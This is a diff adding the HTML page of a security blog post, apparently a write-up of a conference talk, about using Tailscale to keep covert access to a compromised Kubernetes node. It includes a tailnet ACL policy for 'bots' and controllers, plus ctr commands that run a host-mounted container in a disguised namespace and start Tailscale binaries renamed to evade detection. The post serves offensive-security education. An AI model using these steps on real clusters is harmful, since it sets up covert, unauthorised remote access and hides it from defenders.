@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Using Tailscale for persistence</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://raesene.github.io/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				Raesene's Ramblings
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
+				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
+				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="https://raesene.github.io/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Using Tailscale for persistence </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   March 
+	   24th,
+	   
+	   2024
+	 </span>
+	  <div class="article_body">
+	  <p>I’ve written <a href="https://raesene.github.io/blog/2022/06/11/escaping-the-nested-doll-with-tailscale/">before</a> about how there’s lots of innovative uses for <a href="https://tailscale.com/">Tailscale</a> and I was playing with another scenario for my <a href="https://cfp.cloud-native.rejekts.io/cloud-native-rejekts-eu-paris-2024/talk/ZJEVSY/">Cloud Native Rejekts talk</a> (<a href="https://www.youtube.com/watch?v=-9GN057zm_U&amp;t=19240s">Video Recording here</a> ), so I thought it’d be worth writing up as I learned some things along the way!</p>
+
+<p>The idea here is to see how someone could use Tailscale as part of getting persistence on a compromised system (for example a Kubernetes cluster) to keep access in a relatively stealthy fashion. We’re running Tailscale inside a container running on a Kubernetes node and we want to communicate back to a host outside the cluster over the network.</p>
+
+<p>Whilst Tailscale generally uses UDP for its communications, it can also communicate over 443/TCP using <a href="https://tailscale.com/blog/how-tailscale-works#encrypted-tcp-relays-derp">DERP</a> meaning it should work as long as the compromise host can initiate outbound connections on 443/TCP (a reasonably common configuration!)</p>
+
+<h2 id="setting-up-our-tailnet">Setting up our tailnet</h2>
+
+<p>For this I set-up a new isolated tailnet, to keep the ACLs simple. It’s relatively easy to switch between tailnets, so there’s no major downside to having a dedicated tailnet, as all the features we want to use are available on Tailscale’s free tier.</p>
+
+<p>Once we’ve got our new tailnet, the goal is to have two groups of systems. The first one is our controllers, which will connect back into our compromised node(s). The second group is the “bots” which we’ll install on our target systems.</p>
+
+<p>Then we want to configure Tailscale so that traffic from the controllers to the bots is allowed, but no traffic from bots back to controllers (or bots to other bots) is permitted. Tailscale provide a nice ACL system, which we can use to create this setup.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+
+	// Create our bots and controllers groups
+	"tagOwners": {
+		"tag:bots":        ["autogroup:admin"],
+		"tag:controllers": ["autogroup:admin"],
+	},
+
+	"acls": [
+		// Accept traffic from controllers to bots
+		{"action": "accept", "src": ["tag:controllers"], "dst": ["tag:bots:*"]},
+	],
+
+	// Define users and devices that can use Tailscale SSH.
+	"ssh": [
+		// Accept SSH connections from controllers to bots
+		{
+			"action": "accept",
+			"src":    ["tag:controllers"],
+			"dst":    ["tag:bots"],
+			"users":  ["autogroup:nonroot", "root"],
+		},
+	],
+}
+
+</code></pre></div></div>
+
+<p>One slightly un-intuitive piece is that you need to define tags in an ACL policy <em>before</em> assigning them to any hosts.</p>
+
+<p>Once the ACL policy is in place you can just assign a tag to the control host in the Tailscale GUI</p>
+
+<p><img src="https://raesene.github.io/assets/media/tailscale-acl.png" alt="Tailscale ACL" /></p>
+
+<p>For our bots, we can use Tailscale’s <a href="https://tailscale.com/kb/1085/auth-keys">Auth Key</a> feature, and generate a key that can be used for all our bots, but also has the “bot” tag applied to it automatically, so there’s no risk of them inadvertently getting more access than we want.</p>
+
+<p><img src="https://raesene.github.io/assets/media/tailscale-auth-keys.png" alt="Tailscale ACL" /></p>
+
+<h2 id="running-tailscale-on-our-bot-hosts">Running Tailscale on our bot hosts</h2>
+
+<p>Now that we’ve got our tailnet configured, the next step is to deploy on our compromised hosts. In the scenario I used for my talk, the attacker has access to cluster-admin level credentials for a brief period of time, so wants to use Tailscale to help them retain access after that window of opportunity closes.</p>
+
+<p>One way of running Tailscale that should always work is to use a container, as typically Kubernetes cluster nodes can always run containers :) We could either run a new container using the runtime on the node (e.g. Containerd) or use Kubernetes static manifests to have the Kubelet run it for us.</p>
+
+<h3 id="running-with-containerd">Running with Containerd</h3>
+
+<p>It’s possible to use Containerd to run a new container on a Kubernetes node using the provided <code class="language-plaintext highlighter-rouge">ctr</code> client. Whilst there are better clients like <code class="language-plaintext highlighter-rouge">nerdctl</code> available, <code class="language-plaintext highlighter-rouge">ctr</code> will always be available and we can do what we need with it.</p>
+
+<p>One slight complication with this approach is that it won’t work from inside a container (for example the one provided by <code class="language-plaintext highlighter-rouge">kubectl debug node</code>), as Containerd’s API expects the client to have the same resources available to it as the server (unlike Docker, where all that’s required is access to the Docker socket). You can get round this by doing something like SSH’ing to the node.</p>
+
+<p>First up we’ll create a new Containerd namespace. This makes it a little harder to spot the container if someone looks at the containers running on the host.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr namespace create sys_net_mon
+</code></pre></div></div>
+
+<p>Once we’ve created the namespace, we can pull a new container image down to the node. In my case I’ve created an image on Docker hub with Tailscale and a couple of other tools, which I called <code class="language-plaintext highlighter-rouge">systemd_net_mon</code> , no need to make the blue team’s job too easy by calling it something like “botnet_node” :D</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr -n sys_net_mon images pull docker.io/raesene/systemd_net_mon:latest
+</code></pre></div></div>
+
+<p>Once the image is available on the node we can just run it, while providing full access to the node filesystem.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/systemd_net_mon:latest sys_net_mon
+</code></pre></div></div>
+
+<p>Then from inside the container, we just need two commands to start Tailscale up and connect it to our tailnet. Here we can make use of the fact that Tailscale is provided as a pair of Golang binaries, by just renaming them the server to <code class="language-plaintext highlighter-rouge">systemd_net_mon_server</code> and the client to <code class="language-plaintext highlighter-rouge">systemd_net_mon_client</code>. That way if someone runs a process list on the host, that’s all they’ll see, a bit less obvious than tailscale itself.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systemd_net_mon_client up --ssh --hostname cafebot --auth-key=[AUTH_KEY_HERE]
+</code></pre></div></div>
+
+<p>With that, our bot will be up and connected to the Tailnet. We can then connect to it via Tailscale’s embedded SSH daemon, with all the traffic going over the Tailscale tunnel.</p>
+
+<h3 id="running-with-static-manifests">Running with static manifests</h3>
+
+<p>Another way of doing this is to create a static Kubernetes manifest and put it in the directory the Kubelet watches (e.g. <code class="language-plaintext highlighter-rouge">/etc/kubernetes/manifests</code>). The advantages of this approach is that they Kubelet will take care of re-starting the pod if necessary.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This was just a quick walkthrough of using Tailscale for creating a little “botnet”. Whilst there are many tools to do this with, it’s always interesting to explore other options!</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="https://raesene.github.io/categories/index.html#Tailscale-ref">
+					Tailscale <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Using Tailscale for persistence&via=raesene"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Kubernetes, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://raesene.github.io/blog/2024/02/17/a-final-kubernetes-censys/" title="A final Kubernetes census">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2024 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
+</body>
+</html>
+
+
